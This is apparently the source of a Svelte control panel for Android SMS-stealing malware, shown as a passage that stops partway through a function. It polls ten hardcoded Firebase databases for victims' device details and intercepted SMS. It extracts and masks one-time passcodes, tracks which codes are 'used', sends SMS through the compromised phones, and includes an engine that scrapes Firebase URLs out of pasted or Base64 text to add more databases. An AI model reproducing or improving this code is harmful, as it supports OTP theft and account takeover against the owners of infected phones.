<script>
  // ── Svelte action: drag-to-scroll ────────────────────────────────────────
  function dragScroll(node) {
    let isDown = false,
      startY = 0,
      scrollTop = 0;
    const onDown = (e) => {
      isDown = true;
      startY = e.touches?.[0]?.clientY ?? e.clientY;
      scrollTop = node.scrollTop;
      node.style.cursor = "grabbing";
    };
    const onMove = (e) => {
      if (!isDown) return;
      const y = e.touches?.[0]?.clientY ?? e.clientY;
      node.scrollTop = scrollTop - (y - startY);
    };
    const onUp = () => {
      isDown = false;
      node.style.cursor = "";
    };
    node.addEventListener("mousedown", onDown);
    node.addEventListener("touchstart", onDown, { passive: true });
    window.addEventListener("mousemove", onMove);
    window.addEventListener("touchmove", onMove, { passive: true });
    window.addEventListener("mouseup", onUp);
    window.addEventListener("touchend", onUp);
    return {
      destroy() {
        node.removeEventListener("mousedown", onDown);
        node.removeEventListener("touchstart", onDown);
        window.removeEventListener("mousemove", onMove);
        window.removeEventListener("touchmove", onMove);
        window.removeEventListener("mouseup", onUp);
        window.removeEventListener("touchend", onUp);
      },
    };
  }

  // ── Device info helpers ───────────────────────────────────────────────────
  function isOnline(info) {
    if (!info || typeof info !== "object") return null;
    const s =
      info.status ?? info.connectionStatus ?? info.isOnline ?? info.online;
    if (s === true || s === "online" || s === "connected") return true;
    if (s === false || s === "offline" || s === "disconnected") return false;
    // If lastSeen within 3 min, consider online
    const ls = Number(info.lastSeen ?? info.lastMessageTime ?? 0);
    if (ls > 0) return Date.now() - ls < 180_000;
    return null;
  }
  function getBattery(info) {
    if (!info) return null;
    const b = info.battery ?? info.batteryLevel ?? info.bat;
    const n = parseInt(b);
    return isNaN(n) ? null : Math.min(100, Math.max(0, n));
  }
  function batColor(pct) {
    if (pct == null) return "#64748b";
    if (pct >= 60) return "#22c55e";
    if (pct >= 30) return "#fbbf24";
    return "#ef4444";
  }
  function getSims(info) {
    if (!info) return null;
    const s = info.simCount ?? info.sims ?? info.numSims;
    const n = parseInt(s);
    return isNaN(n) ? null : n;
  }
  function fmtPhone(info) {
    if (!info) return "";
    const p =
      info.mobNo ??
      info.phone ??
      info.phoneNumber ??
      info.mobile ??
      info.number ??
      "";
    return String(p).trim();
  }
  function getIp(info) {
    if (!info) return null;
    return info.ip ?? info.ipAddress ?? info.localIp ?? null;
  }
  function getAndroid(info) {
    if (!info) return null;
    return info.androidVersion ?? info.android ?? info.osVersion ?? null;
  }

  // ── Clipboard helper ─────────────────────────────────────────────────────
  function copyText(txt) {
    const s = String(txt ?? "");
    if (!s) return;
    try {
      navigator.clipboard.writeText(s);
    } catch {
      const ta = document.createElement("textarea");
      ta.value = s;
      ta.style.cssText = "position:fixed;opacity:0;top:-9999px";
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
    }
  }

  import "../app.css";
  import { onMount } from "svelte";

  // ── Connections ──────────────────────────────────────────────────────────
  // path: where device keys live (root of messages)
  // infoPath: optional path for device info (status/battery). '' = not available
  let connections = $state([
    {
      id: "c0",
      name: "gunpawdar",
      url: "https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app",
      token: "",
      path: "messages",
      infoPath: "clients",
      color: "#f97316",
      enabled: true,
    },
    {
      id: "c1",
      name: "surajkiwife",
      url: "https://surajkiwife-9b0e2-default-rtdb.firebaseio.com",
      token: "",
      path: "messages",
      infoPath: "clients",
      color: "#38bdf8",
      enabled: true,
    },
    {
      id: "c2",
      name: "ranu",
      url: "https://ranu-e604c-default-rtdb.firebaseio.com",
      token: "",
      path: "messages",
      infoPath: "clients",
      color: "#a78bfa",
      enabled: true,
    },
    {
      id: "c3",
      name: "rambhai",
      url: "https://rambhai-2c356-default-rtdb.firebaseio.com",
      token: "",
      path: "messages",
      infoPath: "clients",
      color: "#34d399",
      enabled: true,
    },
    {
      id: "c4",
      name: "ramesh",
      url: "https://ramesh-67a2b-default-rtdb.firebaseio.com",
      token: "",
      path: "messages",
      infoPath: "clients",
      color: "#fb7185",
      enabled: true,
    },
    {
      id: "c5",
      name: "krisna574",
      url: "https://krisna574-ffef3-default-rtdb.firebaseio.com",
      token: "",
      path: "messages",
      infoPath: "clients",
      color: "#fbbf24",
      enabled: true,
    },
    {
      id: "c6",
      name: "navin",
      url: "https://navin-9fb56-default-rtdb.firebaseio.com",
      token: "",
      path: "messages",
      infoPath: "clients",
      color: "#06b6d4",
      enabled: true,
    },
    {
      id: "c7",
      name: "palms",
      url: "https://palms-568c7-default-rtdb.firebaseio.com",
      token: "",
      path: "messages",
      infoPath: "clients",
      color: "#ec4899",
      enabled: true,
    },
    {
      id: "c8",
      name: "rajkumar",
      url: "https://rajkumar-a67fb-default-rtdb.firebaseio.com",
      token: "",
      path: "messages",
      infoPath: "clients",
      color: "#84cc16",
      enabled: true,
    },
    {
      id: "c9",
      name: "newpanel",
      url: "https://newpanel-4412c-default-rtdb.firebaseio.com",
      token: "",
      path: "messages",
      infoPath: "clients",
      color: "#c084fc",
      enabled: true,
    },
  ]);
  let refreshInterval = $state(null);
  let lastRefresh = $state(null);
  let nextRefreshSecs = $state(10);
  let addOpen = $state(false);
  let form = $state({
    name: "",
    url: "",
    token: "",
    path: "messages",
    infoPath: "clients",
  });
  let addPanelMode = $state('single'); // 'single' | 'bulk' | 'extract'
  let bulkText = $state('');
  let bulkParsed = $derived(parseBulkFirebase(bulkText));

  const ACCENT = [
    "#f97316",
    "#38bdf8",
    "#a78bfa",
    "#34d399",
    "#fb7185",
    "#fbbf24",
    "#06b6d4",
    "#ec4899",
  ];

  // ── DB state ─────────────────────────────────────────────────────────────
  // db[connId] = { loading, error, keys:{devKey:true}, info:{devKey:{status,battery,phone}}, ts }
  let db = $state({});

  // ── Selection / tabs ─────────────────────────────────────────────────────
  let selectedConnId = $state(null);
  let selectedKey = $state(null);
  let activeTab = $state("overview");

  // ── Messages state ────────────────────────────────────────────────────────
  let msgs = $state(null); // { tsKey: {sender,message,type,dateTime} }
  let msgsLoading = $state(false);
  let msgsFilter = $state("all"); // 'all' | 'in' | 'out'
  let msgsSearch = $state("");

  // ── Send SMS ─────────────────────────────────────────────────────────────
  let smsDraft = $state({ to: "", body: "", sim: "0" });
  let smsSending = $state(false);

  // ── Discovered Numbers ──────────────────────────────────────────────────
  let discoveryRecords = $state([]);
  let discoverySearch = $state('');
  let discoverySort = $state('date-desc'); // date-desc | date-asc | conn
  function loadDiscoveryRecords() {
    try {
      const raw = localStorage.getItem('device-number-discovery:engine');
      if (raw) {
        const data = JSON.parse(raw);
        discoveryRecords = (data.records ?? []).filter(r => r.status === 'discovered');
      }
    } catch { discoveryRecords = []; }
  }
  let filteredDiscovery = $derived.by(() => {
    let list = [...discoveryRecords];
    if (discoverySearch.trim()) {
      const q = discoverySearch.trim().toLowerCase();
      list = list.filter(r =>
        r.deviceId?.toLowerCase().includes(q) ||
        r.phoneNumber?.toLowerCase().includes(q) ||
        r.connectionName?.toLowerCase().includes(q)
      );
    }
    if (discoverySort === 'date-desc') list.sort((a, b) => new Date(b.discoveredAt) - new Date(a.discoveredAt));
    else if (discoverySort === 'date-asc') list.sort((a, b) => new Date(a.discoveredAt) - new Date(b.discoveredAt));
    else if (discoverySort === 'conn') list.sort((a, b) => (a.connectionName ?? '').localeCompare(b.connectionName ?? ''));
    return list;
  });

  // ── Sidebar ───────────────────────────────────────────────────────────────
  let sideFilter = $state("all");
  let searchQuery = $state("");
  let sideLimit = $state(100);
  let sideOpen = $state(false); // mobile sidebar drawer
  let sideTab = $state("firebase"); // 'firebase' | 'devices'

  // ── Notifications ───────────────────────────────────────────────────────────
  let notifications = $state([]);
  let prevLastMsgTime = {}; // non-reactive: {connId:{devKey:ts}}
  let notifExpanded = $state(false); // show all vs 2 newest
  let showBellPanel = $state(false); // floating bell dropdown open
  let expandedNotifs = $state(new Set()); // IDs of expanded cards
  let notifSeen = new Set(); // non-reactive: 'connId::devKey::msgId' dedupe

  // ── Dashboard table filters (multi-select AND logic) ─────────────────────
  let tableActiveFilters = $state(new Set()); // Set of 'on'|'off'|'num'|'used'|'new'
  let tableSearch = $state("");
  let tableConnFilter = $state(null); // null = all FBs, or a connId
  let newDeviceKeys = $state(new Set()); // 'connId::key' seen after first load
  const baselineDeviceKeys = new Set(); // non-reactive: keys at first load

  // ── Mobile bottom nav ─────────────────────────────────────────────────────
  let activeBottomTab = $state("dashboard"); // 'dashboard'|'devices'|'notifs'|'send'|'settings'

  function setBottomTab(tab) {
    activeBottomTab = tab;
    if (tab === "dashboard") {
      activeTab = "overview";
      sideOpen = false;
      showBellPanel = false;
    } else if (tab === "devices") {
      sideOpen = !sideOpen;
      if (sideOpen) sideTab = "devices";
      showBellPanel = false;
    } else if (tab === "notifs") {
      showBellPanel = !showBellPanel;
      sideOpen = false;
    } else if (tab === "send") {
      if (selectedKey) {
        activeTab = "send";
      } else {
        toast("Select a device first to send SMS", "info");
        sideOpen = true;
        sideTab = "devices";
      }
      showBellPanel = false;
    } else if (tab === "settings") {
      addOpen = !addOpen;
      sideOpen = false;
      showBellPanel = false;
    }
  }

  // ── Dashboard pagination ───────────────────────────────────────────────────
  const DEVICES_PER_PAGE = 20;
  let devicePage = $state(0);
  let dtScrollEl = $state(null);
  let tabBodyEl = $state(null);

  function setDevicePage(p) {
    devicePage = p;
    if (dtScrollEl) {
      dtScrollEl.scrollTo({ top: 0, behavior: "smooth" });
    }
  }

  $effect(() => {
    // Reset to first page whenever filters or search change
    tableActiveFilters;
    tableConnFilter;
    tableSearch;
    setDevicePage(0);
  });

  // ── Notification panel drag & resize (mouse + touch via pointer events) ───
  let notifPanelPos = $state({ x: 0, y: 0 }); // offset from default anchor
  let notifPanelWidth = $state(360); // custom width in px (min 300, max min(950, window width))
  let notifPanelHeight = $state(null); // custom height in px (null = auto)
  let _ndDragging = $state(false);
  let _ndStart = { cx: 0, cy: 0, px: 0, py: 0 };

  let _nrResizing = $state(false);
  let _nrType = null; // 'left' | 'bottom' | 'bl' | 'br'
  let _nrStart = { cx: 0, cy: 0, w: 360, h: 420 };
  let bellPanelEl = $state(null);

  function notifPanelDragStart(e) {
    // Ignore drag start on buttons, actions, or resize grips
    if (e.target.closest("button, a, input, select, textarea, [role='button'], .bp-actions, .bp-resize-edge, .bp-resize-corner")) return;
    if (e.button !== undefined && e.button !== 0) return; // left click only
    _ndDragging = true;
    const cx = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
    const cy = e.clientY ?? e.touches?.[0]?.clientY ?? 0;
    _ndStart = { cx, cy, px: notifPanelPos.x, py: notifPanelPos.y };
    try {
      e.currentTarget.setPointerCapture?.(e.pointerId);
    } catch {}
  }
  function notifPanelDragMove(e) {
    if (!_ndDragging) return;
    const cx = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
    const cy = e.clientY ?? e.touches?.[0]?.clientY ?? 0;
    notifPanelPos = {
      x: _ndStart.px + (cx - _ndStart.cx),
      y: _ndStart.py + (cy - _ndStart.cy),
    };
  }
  function notifPanelDragEnd(e) {
    if (_ndDragging) {
      _ndDragging = false;
      try {
        e?.currentTarget?.releasePointerCapture?.(e.pointerId);
      } catch {}
    }
  }

  function notifResizeStart(type, e) {
    if (e.button !== undefined && e.button !== 0) return;
    e.stopPropagation();
    _nrResizing = true;
    _nrType = type;
    const cx = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
    const cy = e.clientY ?? e.touches?.[0]?.clientY ?? 0;
    const rect = bellPanelEl?.getBoundingClientRect();
    _nrStart = {
      cx,
      cy,
      w: rect?.width ? Math.round(rect.width) : notifPanelWidth,
      h: rect?.height ? Math.round(rect.height) : (notifPanelHeight || 420),
    };
    try {
      e.currentTarget.setPointerCapture?.(e.pointerId);
    } catch {}
  }

  function notifResizeMove(e) {
    if (!_nrResizing) return;
    e.stopPropagation();
    const cx = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
    const cy = e.clientY ?? e.touches?.[0]?.clientY ?? 0;
    const maxW = typeof window !== "undefined" ? Math.max(300, window.innerWidth - 24) : 950;
    const maxH = typeof window !== "undefined" ? Math.max(200, window.innerHeight - 70) : 800;

    if (_nrType === "left" || _nrType === "bl") {
      const deltaW = _nrStart.cx - cx;
      notifPanelWidth = Math.round(Math.max(300, Math.min(maxW, _nrStart.w + deltaW)));
    } else if (_nrType === "br") {
      const deltaW = cx - _nrStart.cx;
      notifPanelWidth = Math.round(Math.max(300, Math.min(maxW, _nrStart.w + deltaW)));
    }

    if (_nrType === "bottom" || _nrType === "bl" || _nrType === "br") {
      const deltaH = cy - _nrStart.cy;
      notifPanelHeight = Math.round(Math.max(200, Math.min(maxH, _nrStart.h + deltaH)));
    }
  }

  function notifResizeEnd(e) {
    if (_nrResizing) {
      _nrResizing = false;
      _nrType = null;
      try {
        e?.currentTarget?.releasePointerCapture?.(e.pointerId);
      } catch {}
      try {
        localStorage.setItem("pd_notif_panel_w", String(notifPanelWidth));
        if (notifPanelHeight) {
          localStorage.setItem("pd_notif_panel_h", String(notifPanelHeight));
        }
      } catch {}
    }
  }

  function resetNotifPanelSize() {
    notifPanelWidth = 360;
    notifPanelHeight = null;
    notifPanelPos = { x: 0, y: 0 };
    try {
      localStorage.removeItem("pd_notif_panel_w");
      localStorage.removeItem("pd_notif_panel_h");
    } catch {}
    toast("Notification panel size reset", "info");
  }

  // ── Raw ──────────────────────────────────────────────────────────────────
  let rawOpen = $state(false);
  let rawConnId = $state("c0");
  let rawMethod = $state("GET");
  let rawPath = $state("");
  let rawBody = $state("{\n  \n}");
  let rawRes = $state(null);
  let rawLoading = $state(false);

  // ── Used OTPs & Local Phones (localStorage, device-local) ────────────────
  let usedSet = $state(new Set()); // Set of message IDs marked used
  let localPhones = $state({}); // {'connId::devKey': 'phoneStr'}
  let editingPhone = $state(null); // {connId, key} when editing
  let editPhoneVal = $state("");
  let notifsEnabled = $state(true); // global mute toggle
  let showNotifsTab = $state(true); // show/hide notifications tab in bottom nav
  let autoOpenNotif = $state(false); // auto-open panel when new OTP arrives (default OFF)
  let deletedDevices = $state(new Set()); // 'connId::devKey' permanently removed
  let bgRefreshing = $state(false); // silent background refresh in progress

  // ── Toasts ───────────────────────────────────────────────────────────────
  let toasts = $state([]);
  function toast(msg, type = "info") {
    const id = Date.now() + Math.random();
    toasts = [...toasts, { id, msg, type }];
    setTimeout(() => {
      toasts = toasts.map((t) => (t.id === id ? { ...t, out: true } : t));
      setTimeout(() => (toasts = toasts.filter((t) => t.id !== id)), 400);
    }, 3500);
  }

  // ── OTP helpers ───────────────────────────────────────────────────────────
  // Mask OTP: show first 2 digits + dots, copy always uses the real value
  function maskOTP(otp) {
    if (!otp || otp.length <= 2) return otp ?? "";
    return otp.slice(0, 2) + "•".repeat(otp.length - 2);
  }

  // IST 12-hour format (Asia/Kolkata)
  function toIST(val) {
    try {
      const d =
        val instanceof Date
          ? val
          : new Date(typeof val === "number" ? val : String(val));
      if (isNaN(d)) return String(val ?? "");
      return d.toLocaleString("en-IN", {
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
        timeZone: "Asia/Kolkata",
      });
    } catch {
      return String(val ?? "");
    }
  }

  function extractOTP(text) {
    if (!text) return null;
    const nums = String(text).match(/\b(\d{4,8})\b/g);
    if (!nums) return null;
    return (
      nums.find((m) => m.length === 6) ||
      nums.find((m) => m.length === 4) ||
      nums.find((m) => m.length === 8) ||
      nums.find((m) => m.length === 5) ||
      nums.find((m) => m.length === 7) ||
      null
    );
  }

  // Detect OTP / verification messages (only these trigger notifications)
  function isVerificationMsg(text) {
    if (!text) return false;
    const t = String(text).toLowerCase();
    return /\botp\b|verif|one.?time|\bcode\b|\btoken\b|\bpin\b|passcode|authoriz|\bconfirm\b|\bsecret\b/.test(
      t,
    );
  }

  // Extract service name from sender ID (TX-SWIGGY-S → Swiggy) or message
  function extractAbout(sender, text) {
    const sm = String(sender || "").match(
      /^(?:[A-Z]{1,3}-)?([A-Z][A-Z0-9]{2,14})(?:-[A-Z])?$/,
    );
    if (sm) {
      const s = sm[1];
      return s.charAt(0) + s.slice(1).toLowerCase();
    }
    const tm = String(text || "").match(
      /(?:log(?:ging)?\s+(?:in)?to|for|verify|from)\s+(?:your\s+)?([A-Za-z][A-Za-z0-9]{2,14})/i,
    );
    if (tm) return tm[1];
    return null;
  }

  // ── Notification system ───────────────────────────────────────────────────
  const notifTimers = new Map(); // id → timeoutId so we can cancel on clear

  function addNotif(n) {
    if (!notifsEnabled) return;
    // ── Deduplication: skip if we've already seen this exact message ──
    const seenKey = `${n.connId}::${n.devKey}::${n.msgId ?? ""}`;
    if (n.msgId && notifSeen.has(seenKey)) return;
    if (n.msgId) {
      notifSeen.add(seenKey);
      // persist seen keys (keep last 500)
      try {
        const arr = [...notifSeen];
        if (arr.length > 500) arr.splice(0, arr.length - 500);
        localStorage.setItem("pd_notif_seen", JSON.stringify(arr));
      } catch {}
    }
    const id = Date.now() + Math.random();
    notifications = [{ id, ...n, ts: new Date() }, ...notifications].slice(
      0,
      8,
    );
    const t = setTimeout(() => {
      notifTimers.delete(id);
      notifications = notifications.map((x) =>
        x.id === id ? { ...x, leaving: true } : x,
      );
      setTimeout(
        () => (notifications = notifications.filter((x) => x.id !== id)),
        350,
      );
    }, 30000);
    notifTimers.set(id, t);
    // Notification panel stays closed by default — only auto-opens if user explicitly turned it ON in settings
    if (autoOpenNotif) {
      showBellPanel = true;
    }
  }

  function dismissNotif(id) {
    if (notifTimers.has(id)) {
      clearTimeout(notifTimers.get(id));
      notifTimers.delete(id);
    }
    notifications = notifications.map((n) =>
      n.id === id ? { ...n, leaving: true } : n,
    );
    setTimeout(
      () => (notifications = notifications.filter((n) => n.id !== id)),
      350,
    );
  }

  function clearAllNotifs() {
    const count = notifications.length;
    notifTimers.forEach((t) => clearTimeout(t));
    notifTimers.clear();
    notifications = [];
    notifExpanded = false;
    if (count > 0) {
      toast(`Cleared ${count} notification${count === 1 ? "" : "s"}`, "info");
    }
  }

  function clearAllNotifsConfirm() {
    if (
      confirm(
        `Clear all ${notifications.length} notification${notifications.length === 1 ? "" : "s"}?`,
      )
    ) {
      clearAllNotifs();
    }
  }

  function navigateToDevice(connId, devKey) {
    selectDevice(connId, devKey);
    showBellPanel = false; // close bell panel after navigating
  }

  function toggleNotifsEnabled() {
    notifsEnabled = !notifsEnabled;
    try {
      localStorage.setItem("pd_notifs_on", String(notifsEnabled));
    } catch {}
    if (!notifsEnabled) clearAllNotifs();
  }

  function toggleShowNotifsTab() {
    showNotifsTab = !showNotifsTab;
    try {
      localStorage.setItem("pd_show_notifs_tab", String(showNotifsTab));
    } catch {}
  }

  function toggleAutoOpenNotif() {
    autoOpenNotif = !autoOpenNotif;
    try {
      localStorage.setItem("pd_auto_open_notif", String(autoOpenNotif));
    } catch {}
  }

  // ── Deleted devices (localStorage) ────────────────────────────────────────
  function isDeleted(connId, key) {
    return deletedDevices.has(`${connId}::${key}`);
  }
  function markDeleted(connId, key) {
    const next = new Set(deletedDevices);
    next.add(`${connId}::${key}`);
    deletedDevices = next;
    try {
      localStorage.setItem("pd_deleted", JSON.stringify([...next]));
    } catch {}
  }

  // ── Save connections to localStorage ───────────────────────────────────────
  function saveConnections(conns) {
    try {
      localStorage.setItem("pd_connections", JSON.stringify(conns));
    } catch {}
  }

  // ── Used OTP tracking (localStorage) ─────────────────────────────────────
  function isUsed(id) {
    return usedSet.has(String(id));
  }
  function toggleUsed(id) {
    const k = String(id);
    const next = new Set(usedSet);
    next.has(k) ? next.delete(k) : next.add(k);
    usedSet = next;
    try {
      localStorage.setItem("pd_used", JSON.stringify([...next]));
    } catch {}
  }

  // ── Local phone numbers (localStorage, per device) ────────────────────────
  function getLocalPhone(connId, key) {
    return localPhones[`${connId}::${key}`] ?? null;
  }
  function saveLocalPhone(connId, key, phone) {
    const p = phone.trim();
    const up = { ...localPhones };
    if (p) up[`${connId}::${key}`] = p;
    else delete up[`${connId}::${key}`];
    localPhones = up;
    try {
      localStorage.setItem("pd_phones", JSON.stringify(up));
    } catch {}
  }
  function startEditPhone(connId, key) {
    editingPhone = { connId, key };
    editPhoneVal = getLocalPhone(connId, key) ?? "";
  }
  function commitPhone() {
    if (editingPhone) {
      saveLocalPhone(editingPhone.connId, editingPhone.key, editPhoneVal);
    }
    editingPhone = null;
    editPhoneVal = "";
  }

  // ── Display phone: local override → Firebase mobNo → fallback ────────────
  // Strip carrier name + country code → bare 10-digit number (e.g. Jio +916002734479 → 6002734479)
  function extractNumber(phoneStr) {
    if (!phoneStr) return "";
    const s = String(phoneStr).trim();
    const indianMatch = s.match(/(?:(?:\+?91|0)[\s-]*)?([6-9]\d{4}[\s-]?\d{5})/);
    if (indianMatch) {
      return indianMatch[1].replace(/\D/g, "");
    }
    const digits = s.replace(/\D/g, "");
    return digits.length >= 10 ? digits.slice(-10) : digits;
  }

  function copyPhone(rawPhone) {
    const num = extractNumber(rawPhone);
    if (!num) return;
    copyText(num);
    toast(`${num} copied to clipboard`, "success");
  }

  function getDisplayPhone(connId, key, info) {
    return getLocalPhone(connId, key) ?? fmtPhone(info);
  }

  // ── Fetch latest message for notification (OTP/verification only) ──────────
  async function fetchLatestMsg(conn, devKey) {
    try {
      const { data } = await apiFetch(
        conn,
        `${conn.path}/${devKey}`,
        "GET",
        undefined,
        { orderBy: '"$key"', limitToLast: "1" },
      );
      if (!data || typeof data !== "object") return;
      const msg = Object.values(data)[0];
      if (!msg || typeof msg !== "object") return;
      const text = msg.message ?? msg.body ?? msg.text ?? "";
      const otp = extractOTP(text);
      // Only notify for OTP / verification messages
      if (!otp && !isVerificationMsg(text)) return;
      const sender = msg.sender ?? msg.from ?? "?";
      addNotif({
        connId: conn.id,
        conn,
        devKey,
        sender,
        message: text,
        otp,
        about: extractAbout(sender, text),
        msgId: Object.keys(data)[0],
      });
    } catch {}
  }

  // ── API ───────────────────────────────────────────────────────────────────
  function buildUrl(conn, path, params = {}) {
    const base = conn.url.replace(/\/+$/, "");
    const p = String(path ?? conn.path).replace(/^\/+|\/+$/g, "");
    let u = `${base}/${p}.json`;
    const q = [];
    if (conn.token?.trim())
      q.push(`auth=${encodeURIComponent(conn.token.trim())}`);
    Object.entries(params).forEach(([k, v]) =>
      q.push(`${k}=${encodeURIComponent(v)}`),
    );
    if (q.length) u += "?" + q.join("&");
    return u;
  }
  async function apiFetch(conn, path, method = "GET", body, params = {}) {
    const opts = { method, headers: { "Content-Type": "application/json" } };
    if (body !== undefined) opts.body = JSON.stringify(body);
    const res = await fetch(buildUrl(conn, path, params), opts);
    const json = await res.json();
    if (!res.ok) throw new Error(json?.error ?? `${res.status}`);
    return { status: res.status, data: json };
  }

  // ── Fetch: shallow key list + device info ─────────────────────────────────
  async function fetchConn(conn, silent = false) {
    if (!conn.enabled) return;
    // Silent = keep existing data visible while fetching; only show loading on first fetch
    const hasData =
      db[conn.id]?.keys && Object.keys(db[conn.id].keys).length > 0;
    if (!silent || !hasData) {
      db = { ...db, [conn.id]: { ...db[conn.id], loading: true, error: null } };
    }
    try {
      // 1. Get all device keys (shallow, instant)
      const { data: keysData } = await apiFetch(
        conn,
        conn.path,
        "GET",
        undefined,
        { shallow: "true" },
      );
      const keys = keysData && typeof keysData === "object" ? keysData : {};

      // 2. Get device info (status/battery/phone) from infoPath if available
      let info = db[conn.id]?.info ?? {};
      const prevInfo = db[conn.id]?.info ?? {}; // snapshot before update
      if (conn.infoPath) {
        try {
          const { data: infoData } = await apiFetch(conn, conn.infoPath);
          if (infoData && typeof infoData === "object") {
            info = infoData;
            // ── Detect new messages via lastMessageTime ───────────────────
            for (const [devKey, devInfo] of Object.entries(infoData)) {
              if (!devInfo || typeof devInfo !== "object") continue;
              const newTs = Number(devInfo.lastMessageTime ?? 0);
              const prevTs = Number(prevInfo[devKey]?.lastMessageTime ?? 0);
              if (newTs && prevTs && newTs > prevTs) {
                fetchLatestMsg(conn, devKey); // fire-and-forget
              }
            }
          }
        } catch {}
      }

      // Detect new device keys (not present at baseline / first load)
      const prevKeys = new Set(Object.keys(db[conn.id]?.keys ?? {}));
      for (const k of Object.keys(keys)) {
        const uid = `${conn.id}::${k}`;
        if (baselineDeviceKeys.size > 0 && !baselineDeviceKeys.has(uid)) {
          newDeviceKeys = new Set([...newDeviceKeys, uid]);
        }
      }

      db = {
        ...db,
        [conn.id]: { loading: false, error: null, keys, info, ts: new Date() },
      };
    } catch (e) {
      db = {
        ...db,
        [conn.id]: {
          ...db[conn.id],
          loading: false,
          error: e.message,
          ts: new Date(),
        },
      };
      if (!silent) toast(`[${conn.name}] ${e.message}`, "error");
    }
  }

  async function fetchAll(silent = false) {
    bgRefreshing = true;
    await Promise.allSettled(
      connections.filter((c) => c.enabled).map((c) => fetchConn(c, silent)),
    );
    bgRefreshing = false;
    lastRefresh = new Date();
    nextRefreshSecs = 10;
    // After first load, capture baseline device keys so subsequent fetches can detect "new"
    if (!silent && baselineDeviceKeys.size === 0) {
      for (const c of connections) {
        for (const k of Object.keys(db[c.id]?.keys ?? {})) {
          baselineDeviceKeys.add(`${c.id}::${k}`);
        }
      }
    }
  }

  onMount(() => {
    // ── Restore ALL localStorage state ──────────────────────────────────────
    try {
      usedSet = new Set(JSON.parse(localStorage.getItem("pd_used") || "[]"));
    } catch {}
    loadDiscoveryRecords();
    try {
      localPhones = JSON.parse(localStorage.getItem("pd_phones") || "{}");
    } catch {}
    try {
      deletedDevices = new Set(
        JSON.parse(localStorage.getItem("pd_deleted") || "[]"),
      );
    } catch {}
    try {
      notifsEnabled = localStorage.getItem("pd_notifs_on") !== "false";
    } catch {}
    try {
      showNotifsTab = localStorage.getItem("pd_show_notifs_tab") !== "false";
    } catch {}
    try {
      autoOpenNotif = localStorage.getItem("pd_auto_open_notif") === "true";
    } catch {}
    // Restore resized notification panel dimensions
    try {
      const savedW = parseInt(localStorage.getItem("pd_notif_panel_w"), 10);
      if (savedW && savedW >= 300 && savedW <= 1400) notifPanelWidth = savedW;
      const savedH = parseInt(localStorage.getItem("pd_notif_panel_h"), 10);
      if (savedH && savedH >= 200 && savedH <= 2500) notifPanelHeight = savedH;
    } catch {}
    // Restore seen notification IDs so refresh doesn't re-trigger same messages
    try {
      notifSeen = new Set(
        JSON.parse(localStorage.getItem("pd_notif_seen") || "[]"),
      );
    } catch {}
    // Restore persisted connections (merge over defaults — user additions win)
    try {
      const saved = JSON.parse(
        localStorage.getItem("pd_connections") || "null",
      );
      if (Array.isArray(saved) && saved.length) {
        // Merge: keep hardcoded defaults by id, append any extra user-added ones
        const defaultIds = new Set(connections.map((c) => c.id));
        const extras = saved.filter((c) => !defaultIds.has(c.id));
        // Restore enabled state from saved for existing connections
        connections = connections
          .map((c) => {
            const s = saved.find((x) => x.id === c.id);
            return s ? { ...c, enabled: s.enabled } : c;
          })
          .concat(extras);
      }
    } catch {}

    fetchAll(false); // first load: show loading state
    refreshInterval = setInterval(() => fetchAll(true), 10_000); // bg silent auto-refresh every 10s
    const ticker = setInterval(() => {
      nextRefreshSecs = nextRefreshSecs > 0 ? nextRefreshSecs - 1 : 0;
    }, 1000);
    return () => {
      clearInterval(refreshInterval);
      clearInterval(ticker);
    };
  });

  // ── Connection management ─────────────────────────────────────────────────
  function parseBulkFirebase(text) {
    if (!text || !text.trim()) return [];
    // Support both firebasedatabase.app and firebaseio.com domains
    const urlRegex = /https:\/\/[a-zA-Z0-9_-]+-default-rtdb(?:\.[a-zA-Z0-9-]+)*\.(?:firebasedatabase\.app|firebaseio\.com)/gi;
    const matches = text.match(urlRegex) || [];
    return [...new Set(matches.map(u => u.replace(/\/+$/, '')))];
  }

  // ── Universal Firebase Extraction Engine ────────────────────────────────────
  // Safety limits
  const UX_MAX_INPUT_BYTES = 5 * 1024 * 1024; // 5 MB
  const UX_MAX_DEPTH = 5;                      // recursion depth
  const UX_MAX_URLS = 500;                     // max extracted URLs
  const UX_TIMEOUT_MS = 3000;                  // hard timeout

  const FB_URL_RE = /https?:\/\/[a-zA-Z0-9_-]+-default-rtdb(?:\.[a-zA-Z0-9-]+)*\.(?:firebasedatabase\.app|firebaseio\.com)/gi;

  /** Scan text for Firebase RTDB URLs, return unique list */
  function scanFirebaseUrls(text) {
    if (!text || typeof text !== 'string') return [];
    const m = text.match(FB_URL_RE) || [];
    return [...new Set(m.map(u => u.replace(/\/+$/, '')))];
  }

  /** Try to extract a project name from a Firebase URL hostname */
  function nameFromFbUrl(url) {
    try { return new URL(url).hostname.split('-')[0]; } catch { return ''; }
  }

  /** Check if a string looks like Base64 (min length, valid chars) */
  function looksLikeBase64(s) {
    if (!s || s.length < 20) return false;
    // Allow URL-safe or standard Base64, with optional padding
    return /^[A-Za-z0-9+/=_-]{20,}$/.test(s.replace(/\s/g, ''));
  }

  /** Try to decode a Base64 string (handles URL-safe variant) */
  function tryBase64Decode(s) {
    try {
      let b = s.replace(/-/g, '+').replace(/_/g, '/');
      // Fix padding
      const pad = (4 - (b.length % 4)) % 4;
      b += '='.repeat(pad);
      b = b.replace(/[^A-Za-z0-9+/=]/g, '');
      const decoded = atob(b);
      // Sanity check: must produce mostly printable chars
      let printable = 0;
      for (let i = 0; i < Math.min(decoded.length, 200); i++) {
        const c = decoded.charCodeAt(i);
        if ((c >= 32 && c < 127) || c === 10 || c === 13 || c === 9) printable++;
      }
      if (printable / Math.min(decoded.length, 200) < 0.7) return null;
      return decoded;
    } catch {
      return null;
    }
  }

  /**
   * Recursively extract Firebase connections from arbitrary input.
   * @param {string} input — raw text/JSON/Base64/URL/etc
   * @param {string} source — label for where this input came from
   * @param {number} depth — current recursion depth
   * @param {number} startTime — Date.now() at start of extraction
   * @returns {{url: string, name: string, source: string}[]}
   */
  function deepExtract(input, source, depth, startTime) {
    if (depth > UX_MAX_DEPTH) return [];
